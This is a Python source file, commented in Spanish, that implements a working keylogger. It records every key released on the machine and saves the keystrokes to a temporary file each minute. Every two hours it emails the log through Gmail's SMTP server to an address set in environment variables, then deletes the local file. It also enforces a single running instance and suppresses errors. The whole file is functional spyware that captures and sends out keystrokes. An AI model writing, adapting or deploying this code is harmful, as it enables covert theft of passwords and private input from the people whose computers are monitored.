# coding=utf-8
#!/usr/bin/python3

import keyboard, smtplib, os, sys, time, platform
from threading import Timer
from datetime import datetime, timedelta
os.environ["PBR_VERSION"] = "1.0.0"
from tendo import singleton

FILE_INTERVAL = 60
MAIL_INTERVAL = 3600*2
MAIL_DEST = os.environ["MAIL_DEST"]
MAIL_SOURCE = os.environ["MAIL_SOURCE"]
MAIL_PASSWORD = os.environ["MAIL_PASSWORD"]

class Keylogger:
    def __init__(self):
        self.interval = FILE_INTERVAL
        self.mail_interval = MAIL_INTERVAL
        self.log = ""  # string que contiene el log de pulsaciones (búfer) del self.interval
        self.stard_dt = self.end_dt = datetime.now()
        
    def callback(self, event):  # método llamado cuando se libera la pulsación de una tecla
        name = event.name
        special = {"space":" ", "enter":"[↵]\n", "backspace":"[BS]", "bloq mayus":"[CAPS_LOCK]", "decimal":"."}
        if len(name) > 1:  # tecla especial, reemplaza su nombre por una abreviación
            if name in special:
                name = special[name]
            # abreviaciones de Vim: C = Ctrl, S = Shift, M = Alt
            elif name in ("ctrl", "right ctrl", "ctrl derecha"):
                name = "[C]"
            elif name in ("shift", "mayusculas", "right shift"):
                name = "[S]"
            elif name in ("alt", "right alt"):
                name = "[M]"
            elif name in ("left windows", "windows izquierda"):
                name = "[WIN]"
            elif name in ("left", "flecha izquierda"):
                name = "[<]"
            elif name in ("right", "flecha derecha"):
                name = "[>]"
            elif name in ("up", "flecha arriba"):
                name = "[^]"
            elif name in ("down", "flecha abajo"):
                name = "[v]"
            else:
                name = f"[{name.replace(' ', '_').upper()}]"
        self.log += name  # añade el nombre de la tecla al búfer
        
    def savefile(self):
        end_dt_str = self.end_dt.strftime("%H:%M:%S")
        # lee el búfer y reemplaza la combinación de acento+vocal por el carácter adecuado
        accents = {"´a":"á", "´e":"é", "´i":"í", "´o":"ó", "´u":"ú",
        "`a":"à", "`e":"è", "`i":"ì", "`o":"ò", "`u":"ù"}
        for key, value in accents.items():
            if key in self.log:
                self.log = self.log.replace(key, value)
        with open(f"{self.filename}", "a", encoding="utf-8") as f:
            print(self.log, file=f)
        print(f"[+] Log guardado en {end_dt_str}:\n{self.log}")
        
    def sendmail(self, source=MAIL_SOURCE, dest=MAIL_DEST, password=MAIL_PASSWORD):
        # método llamado cada self.mail_interval: envía el archivo y lo elimina
        # el programa seguirá en ejecución, y el archivo volverá a crearse cuando haya actividad
        try:  # excepción comprueba que archivo de log exista
            if os.path.exists(f"{self.filename}"):
                with open(f"{self.filename}", "r", encoding="utf-8") as f:
                    end_dt_str = self.end_dt.strftime("%d-%m-%Y - %H:%M")
                    message = f"Subject: Log de {end_dt_str}\n\n{f.read()}"
                    print(f"[+] Enviando mail:\n{message}")
                server = smtplib.SMTP(host="smtp.gmail.com", port=587)
                server.starttls()
                server.login(source, password)
                server.sendmail(source, dest, message.encode("utf-8"))
                server.quit()
                print(f"[+] Log enviado: '{source}' -> '{dest}'.\n[-] Eliminando '{self.filename}'.")
                os.remove(f"{self.filename}")
        except:
            pass
        timer = Timer(interval=self.mail_interval, function=self.sendmail)
        timer.daemon = True
        timer.start()
        
    def report(self):  # método llamado cada self.interval: hace la llamada para guardar el archivo y resetea el búfer
        if self.log.rstrip():
            self.end_dt = datetime.now()
            self.savefile()
            self.start_dt = datetime.now()
            self.log = ""
        # comprueba si han pasado 5 minutos de inactividad con el búfer vacío
        elif not self.log and (datetime.now() - self.start_dt) > timedelta(minutes=5):
            print("[-] Sin actividad por 5 minutos, añadiendo salto de línea.")
            self.log += "\n"
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
        
    def start(self):  # define el path en función del SO, inicializa keyboard y las funciones timer
        self.start_dt = datetime.now()
        start_dt_str = self.start_dt.strftime("%d-%m-%Y - %H:%M:%S")
        if platform.system() == "Windows":
            self.filename = "C:\\Temp\\pulsaciones_grabadas.txt"
        elif platform.system() == "Linux":
            self.filename = "/var/tmp/pulsaciones_grabadas.txt"
        print(self.filename)
        print(f"[*] Keylogger iniciado en {start_dt_str}\n[*] Registrando logs en '{self.filename}'")
        keyboard.on_release(callback=self.callback)
        self.report()
        self.sendmail()
        keyboard.wait("ctrl+shift+space")
        # guarda el búfer y envía el archivo cuando se interrumpe la ejecución manualmente
        print("[-] [C-S-SPACE]: Registro interrumpido, exportando por mail.")
        self.report()
        self.sendmail()
        time.sleep(1)
        
if __name__ == "__main__":
    try:  # comprueba que exista una única instancia del programa en ejecución
        lock = singleton.SingleInstance()
        keylogger = Keylogger()
        keylogger.start()
    except:
        sys.exit()
